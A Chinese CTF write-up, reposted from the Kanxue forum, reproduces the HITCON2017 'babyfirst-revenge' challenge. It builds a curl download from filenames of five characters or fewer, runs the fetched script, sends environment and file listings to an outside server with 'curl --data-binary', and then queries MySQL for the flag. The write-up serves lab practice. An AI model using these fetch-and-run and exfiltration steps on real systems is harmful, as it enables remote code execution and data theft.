---
title: HITCON2017 babyfirst-revenge 看雪 CTF 复现
url: https://mp.weixin.qq.com/s/cy0ACr4tcYM0m1dpgFmRBA
source: Doonsec's feed
date: 2026-09-23
fetch_date: 2026-09-24T06:59:35.317077
---

# HITCON2017 babyfirst-revenge 看雪 CTF 复现

# HITCON2017 babyfirst-revenge 看雪 CTF 复现

the\_hs
the\_hs

看雪学苑

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

我愿称之为“第三方 WP 都只差最后半步”的一题。

原题本身并不新，核心还是利用长度不超过 5 的命令，通过文件名、续行符和 `ls -t` 拼出长命令。

但是看雪环境有几个额外问题：

* `REMOTE_ADDR`

  是网关内网 IP，不是攻击者公网 IP；
* 公网 IP 哈希出的 sandbox 路径没有用；
* 部分第三方 WP 里的命令实际上超过长度限制；
* 部分 WP 依赖自己持有短域名；
* `curl ... | sh`

  在这台靶机上实测不稳定；
* 直接把小数点 IP 分段成文件名还容易踩隐藏文件问题。

Step.0 准备一个 80 端口可用的服务器

需要一台靶机能够访问的 HTTP 服务器。

我这里使用 FRP，把本地 8000 端口映射到公网服务器的 80 端口：

```
serverAddr = "11.4.5.14"
serverPort = 7000
auth.token = "********"

[[proxies]]
name = "ctf_http_80"
type = "tcp"
localIP = "127.0.0.1"
localPort = 8000
remotePort = 80
```

本地 HTTP 服务需要实现两个功能：

* 返回动态修改的 `index.html`；
* 接收靶机通过 `curl --data-binary` 回传的数据。

建议记录 User-Agent。公网 80 端口会有大量扫描日志，靶机的请求大概是：

```
GET /from ... UA='curl/7.47.0'
```

---

Step.1 为什么不能直接照抄第三方 WP

`ls>>a写不进去`

不少 WP 使用下面的第一阶段：

```
>-t\
>\>q
>l\
>s\ \
ls>a
ls>>a
```

问题是这台机器>>和｜都莫名其妙写不进去，可能是ngx或者什么拦截了...

`REMOTE_ADDR 不是你的公网 IP`

原题 sandbox 是：

```
$sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
```

但是看雪靶机前面有网关反代，PHP 看到的 `REMOTE_ADDR` 是网关内网地址，而不是攻击者出口 IP。

所以第三方 WP 中这种操作会失败：

```
md5("orange" + 自己的公网IP)
```

然后访问：

```
/sandbox/<md5>/xxx
```

算出来的目录根本不是当前 sandbox。

因此最好直接把命令结果通过 HTTP POST 回传，不要依赖猜 sandbox 路径。

短域名 WP 不能直接替换成 IP

有第三方 WP 使用类似下面的技巧：

```
>echo
>w\
*>>.a
rm w*
>ge\
*>>.a
...
```

它的前提是攻击者持有一个足够短的字母域名，例如：

```
zxzz.tk
```

因为 `echo` 在字典序上排在 `w`、`ge`、`zx` 等文件名前面，所以：

```
*>>.a
```

展开后才会变成：

```
echo w\ >> .a
```

如果直接把域名替换成数字 IP，数字文件名会排在 `echo` 前面：

```
11\
.4.\
5.1\
...
```

此时 `*` 展开后的第一个单词就不再是 `echo`，而是数字文件名，命令直接失败。

如果把点号放在文件名开头，例如：

```
>.14
>.5\
```

又会创建隐藏文件，默认 `ls` 根本不会把它们列出来。

`curl ... | sh 在这台靶机上不稳定`

理论上有多种 WP 使用：

```
curl IP | sh
```

我也构造出了对应命令，而且服务器确实收到了靶机的请求：

```
GET /from ... UA='curl/7.47.0'
```

说明 `curl` 成功了。

但是返回的 payload 没有继续执行。使用：

```
sleep 10
```

做测试，也没有观察到对应延时。

所以不要在这个环境里赌管道，直接改成：

```
curl IP -o x
sh x
```

落盘以后再执行，稳定很多。

Step.2 第一阶段：构造 `ls -t>g`

这里使用 Orange 官方 exploit 的第一阶段。

按顺序请求：

```
>ls\
ls>_
>\ \
>-t\
>\>g
ls>>_
```

每个命令长度都小于等于 5。

这个阶段会利用特殊文件名和续行符，把文件 `_` 拼成一个脚本，其中有效命令是：

```
ls -t>g
```

之后执行：

```
sh _
```

就会按照文件修改时间倒序，把当前目录中的文件名写入 `g`。

注意 `ls -t` 也会把 `_`、`g` 自身以及第一阶段的残留文件列进去，但这些多余行会因续行符拼接成无效命令而报错，不影响有效命令的执行。

Step.3 第二阶段：拼出下载命令

假设公网服务器是：

```
11.4.5.14
```

我们要构造：

```
curl 11.4.5.14 -o x
```

把它按文件名和续行符拆成：

```
cu\
rl\
 1\
1.\
4.\
5.\
14\
 -\
o\
 x
```

由于 `ls -t` 是新文件在前，所以实际创建文件时要反过来，从最后一段开始创建：

```
>\ x
>o\
>\ -\
>14\
>5.\
>4.\
>1.\
>\ 1\
>rl\
>cu\
```

然后执行：

```
sh _
sh g
sh x
```

含义分别是：

* `sh _`

  执行第一阶段生成的脚本，得到文件 `g`；
* `sh g`

  执行 `curl 11.4.5.14 -o x`，下载远程 payload；
* `sh x`

  执行下载下来的脚本。

服务器上应该能看到：

```
GET /from ... UA='curl/7.47.0'
```

这一步成功以后，就获得了稳定的任意命令执行能力。

Step.4 回传命令结果

在公网服务器的 `index.html` 中放：

```
#!/bin/sh
{
echo '=== pwd/id/env ==='
pwd
id
env

echo '=== root ==='
ls -la /

echo '=== readme ==='
cat /README.txt 2>/dev/null

echo '=== mysql ==='
command -v mysql || true
} 2>&1 | curl --data-binary @- http://11.4.5.14/upload
```

重新执行：

```
sh _
sh g
sh x
```

服务器会收到：

```
POST /upload from ... UA='curl/7.47.0'
```

回显中的关键内容是：

```
/www/sandbox/3a5463e2cd4fa054a8bc44da1b1bbcaa
uid=33(www-data) gid=33(www-data)
```

以及根目录下的：

```
/README.txt
```

内容为：

```
Flag is in the MySQL database
fl4444g / SugZXUtgeJ52_Bvr
```

---

Step.5 查询 MySQL

把远程 `index.html` 改成：

```
#!/bin/sh
{
echo '=== databases ==='
  mysql -ufl4444g -pSugZXUtgeJ52_Bvr \
    -e 'show databases;'

echo '=== flag ==='
  mysql -ufl4444g -pSugZXUtgeJ52_Bvr \
    -e 'SELECT * FROM fl4gdb.this_is_the_fl4g;'
} 2>&1 | curl --data-binary @- http://11.4.5.14/upload
```

再次执行：

```
sh _
sh g
sh x
```

数据库返回：

```
Database
information_schema
fl4gdb
mysql
performance_schema
sys
```

最终查询结果：

```
secret
flag{43a0eac7-3bb6-471a-864d-2a75b894c8b9}
```

---

Flag

```
flag{43a0eac7-3bb6-471a-864d-2a75b894c8b9}
```

---

总结

这题真正可用的路线是：

```
文件名 + 续行符
        ↓
构造 ls -t>g
        ↓
用 ls -t 拼出 curl IP -o x
        ↓
下载 payload 到 x
        ↓
sh x
        ↓
curl POST 回显
        ↓
README 获取 MySQL 凭据
        ↓
查询 fl4gdb.this_is_the_fl4g
```

第三方 WP 的主要问题不是思路错误，而是看雪环境把它们依赖的条件拆掉了：

* `ls>>a`

  中的 `>>` 实测写不进去（可能被拦截）；
* sandbox 哈希不能用自己的公网 IP 计算；
* 短域名技巧不能直接替换成数字 IP；
* 点号开头的文件名会被 `ls` 隐藏；
* `curl | sh`

  在当前环境中不稳定。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Cpo2XCpI7K0UbpQAIxu4bAicia1aQ2GvexX3X7WBQyPxuVEfqX3TgEKz4MlCcxWPCZQlbYgMWZzmEiaDmxtibEWBBrBL0jLEyo7xPe7YucgPKaY/640?wx_fmt=png&from=appmsg)

看雪ID：the\_hs

https://bbs.kanxue.com/user-home-994475.htm

\*本文为看雪论坛优秀文章，由 the\_hs 原创，转载请注明来自看雪社区

[![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Cpo2XCpI7K1AwbHhwfQiauAWSoPAoxlgD2Zz01iaZNnu3GCcPiaXSh9jibSeJ97LHOEfHBE5py6v6zwAcotNibKBhic8wXyf2LvheA46nn451LJFY/640?wx_fmt=jpeg&from=appmsg)](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458616439&idx=1&sn=ed63972eed0764f9dc562e899e512e05&scene=21#wechat_redirect)

第十届安全开发者峰会【议题征集】-欢迎投稿

# 往期推荐

[从 r0capture 到 eCapture：Hermes Agent 自动抓包在真实任务里的价值](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458618507&idx=1&sn=77bdb73ed02c2ca4234d6e63120c9282&scene=21#wechat_redirect)

[Kali 下 Android Studio 无法输入中文的问题排查与解决](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458618459&idx=1&sn=b445b8909b73c5c33e80ec7bbf7d351f&scene=21#wechat_redirect)

[Intel 酷睿 CPU Management Engine 固件研究与分析逆向：实战DCI链接与ME解锁尝试](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458618431&idx=1&sn=6fb037cb1e411b795256e427858c349c&scene=21#wechat_redirect)

[记一次入门级DexVMP分析](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458618398&idx=2&sn=533b3c8caabaee9461f35aad0b407035&scene=21#wechat_redirect)

[DirtyFrag浅析及一条新的攻击路径](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458618348&idx=2&sn=d9c412412014b4d272cd580be7c52053&scene=21#wechat_redirect)

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/Uia4617poZXP96fGaMPXib13V1bJ52yHq9ycD9Zv3WhiaRb2rKV6wghrNa4VyFR2wibBVNfZt3M5IuUiauQGHvxhQrA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8Hice1nuesdoDZjYQzRMv9tpvJW9icibkZBj9PNBzyQ4d4JFoAKxdnPqHWpMPQfNysVmcL1dtRqU7VyQ/640?wx_fmt=gif&from=appmsg)

**球分享**

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8Hice1nuesdoDZjYQzRMv9tpvJW9icibkZBj9PNBzyQ4d4JFoAKxdnPqHWpMPQfNysVmcL1dtRqU7VyQ/640?wx_fmt=gif&from=appmsg)

**球点赞**

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8Hice1nuesdoDZjYQzRMv9tpvJW9icibkZBj9PNBzyQ4d4JFoAKxdnPqHWpMPQfNysVmcL1dtRqU7VyQ/640?wx_fmt=gif&from=appmsg)

**球在看**

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8Hice1nuesdoDZjYQzRMv9tpUHZDmkBpJ4khdIdVhiaSyOkxtAWuxJuTAs8aXISicVVUbxX09b1IWK0g/640?wx_fmt=gif&from=appmsg)

点击阅读原文查看更多

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8EGLfh77kFmnicd9WOic2ibvhCibFdB4bL4srJCgo2wnvdoXLxpIvAkfCmmcptXZB0qKWMoIP8iaibYN2FA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过